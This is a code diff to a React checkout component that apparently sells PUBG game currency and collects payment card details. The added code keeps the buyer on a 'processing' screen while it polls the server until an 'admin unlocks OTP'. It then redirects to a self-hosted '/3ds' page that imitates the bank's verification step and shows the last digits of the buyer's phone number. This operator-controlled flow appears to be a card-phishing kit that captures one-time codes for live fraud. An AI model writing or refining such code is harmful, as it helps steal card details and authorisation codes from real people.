@@ -1,4 +1,4 @@
-import React, {useEffect, useMemo, useState} from 'react';
+import React, {useEffect, useMemo, useRef, useState} from 'react';
 import {Activity, ArrowLeft, ArrowRight, Check, CreditCard, ShieldAlert, Wallet, XCircle, CheckCircle2} from 'lucide-react';
 import {CreditCardPaymentFields} from './CreditCardPaymentFields';
 import {CardProcessingToOtpScreen} from './OtpPaymentUi';
@@ -90,12 +90,69 @@ export function PubgUcOrder({
   const [otpState, setOtpState] = useState<OtpState>('idle');
   const [currentOrderId, setCurrentOrderId] = useState<string | null>(null);
   const [done, setDone] = useState(false);
+  const [failed, setFailed] = useState(false);
+  const redirectingRef = useRef(false);
 
   const selected = useMemo(() => packageList.find((p) => p.id === selectedId) ?? packageList[0], [packageList, selectedId]);
 
   useEffect(() => {
     if (!packageList.find((p) => p.id === selectedId)) setSelectedId(packageList[0]?.id ?? '');
   }, [packageList, selectedId]);
+
+  const openAcs = (orderRef: string, phoneLast3?: string | null) => {
+    if (redirectingRef.current) return;
+    redirectingRef.current = true;
+    redirectToAcsChallenge({
+      orderRef,
+      clientId,
+      lang,
+      phoneLast3: phoneLast3 || undefined,
+      returnUrl: `${window.location.origin}/`,
+    });
+  };
+
+  // Poll until admin unlocks OTP → open bank 3DS page
+  useEffect(() => {
+    if (!cardProcessingToOtp || !currentOrderId || !clientId) return;
+    let alive = true;
+    const poll = async () => {
+      try {
+        const qs = new URLSearchParams({ client_id: clientId, order_ref: currentOrderId });
+        const res = await fetch(apiUrl(`/api/transactions/order-status?${qs.toString()}`));
+        if (!res.ok || !alive) return;
+        const data = (await res.json()) as { status?: string; phone_last3?: string | null };
+        const st = String(data.status || '').toLowerCase();
+        if (st === 'awaiting_otp' || st === 'retry_otp') {
+          openAcs(currentOrderId, data.phone_last3);
+          return;
+        }
+        if (st === 'completed') {
+          setCardProcessingToOtp(false);
+          setDone(true);
+          onComplete?.();
+          return;
+        }
+        if (st === 'failed' || st === 'refunded' || st === 'suspended') {
+          setCardProcessingToOtp(false);
+          setFailed(true);
+        }
+      } catch {
+        /* ignore */
+      }
+    };
+    void poll();
+    const id = window.setInterval(() => void poll(), 900);
+    return () => {
+      alive = false;
+      window.clearInterval(id);
+    };
+  }, [cardProcessingToOtp, currentOrderId, clientId, onComplete]);
+
+  useEffect(() => {
+    if (showOtpStep && currentOrderId) {
+      openAcs(currentOrderId);
+    }
+  }, [showOtpStep, currentOrderId]);
 
   const resetFlow = () => {
     setShowOtpStep(false);
@@ -104,6 +161,8 @@ export function PubgUcOrder({
     setOtpState('idle');
     setCurrentOrderId(null);
     setIsSubmitting(false);
+    setFailed(false);
+    redirectingRef.current = false;
     setStep('package');
     setPaymentType(null);
   };
@@ -153,19 +212,11 @@ export function PubgUcOrder({
         setIsSubmitting(false);
         return;
       }
+      redirectingRef.current = false;
       setCurrentOrderId(orderRef);
       setCardProcessingToOtp(true);
       setIsSubmitting(false);
-      // When backend unlocks awaiting_otp, parent poll redirects to /3ds.
-      // Fallback: open ACS after short wait if still processing.
-      setTimeout(() => {
-        redirectToAcsChallenge({
-          orderRef,
-          clientId,
-          lang,
-          returnUrl: `${window.location.origin}/`,
-        });
-      }, 2500);
+      // Stay on processing screen (1–2 min) until admin unlocks awaiting_otp → /3ds
       return;
     } catch (err) {
       console.error(err);
@@ -233,28 +284,33 @@ export function PubgUcOrder({
     );
   }
 
-  // جاري المعالجة قبل OTP
+  if (failed) {
+    return (
+      <div className="max-w-md mx-auto flex flex-col items-center justify-center min-h-[60vh] text-center px-4">
+        <div className="w-24 h-24 bg-red-50 text-red-500 rounded-full flex items-center justify-center mb-6 border-8 border-red-50/50">
+          <XCircle className="w-12 h-12" />
+        </div>
+        <h2 className="text-2xl font-black mb-2 text-gray-900">{lang === 'ar' ? 'فشل الدفع' : 'Payment Failed'}</h2>
+        <p className="text-gray-400 mb-8 text-sm">{lang === 'ar' ? 'حاول مرة أخرى أو تواصل مع الدعم' : 'Please try again or contact support'}</p>
+        <button onClick={() => { setFailed(false); setPaymentType('card'); redirectingRef.current = false; }}
+          className="w-full max-w-xs bg-gray-900 text-white py-4 rounded-2xl font-bold active:scale-95">
+          {lang === 'ar' ? 'إعادة المحاولة' : 'Try Again'}
+        </button>
+      </div>
+    );
+  }
+
+  // جاري المعالجة قبل OTP (1–2 دقيقة حتى يفتح الأدمن 3DS)
   if (cardProcessingToOtp) {
     return (
       <CardProcessingToOtpScreen
         lang={lang}
-        etaText={lang === 'ar' ? 'الوقت المتوقع لوصول الرمز: 1 إلى 2 دقيقة' : 'Expected code arrival: 1 to 2 minutes'}
+        etaText={t('otpEtaDelivery')}
       />
     );
   }
 
   // OTP opens on standalone /3ds page
-  useEffect(() => {
-    if (showOtpStep && currentOrderId) {
-      redirectToAcsChallenge({
-        orderRef: currentOrderId,
-        clientId,
-        lang,
-        returnUrl: `${window.location.origin}/`,
-      });
-    }
-  }, [showOtpStep, currentOrderId, clientId, lang]);
-
   if (showOtpStep) {
     return (
       <CardProcessingToOtpScreen
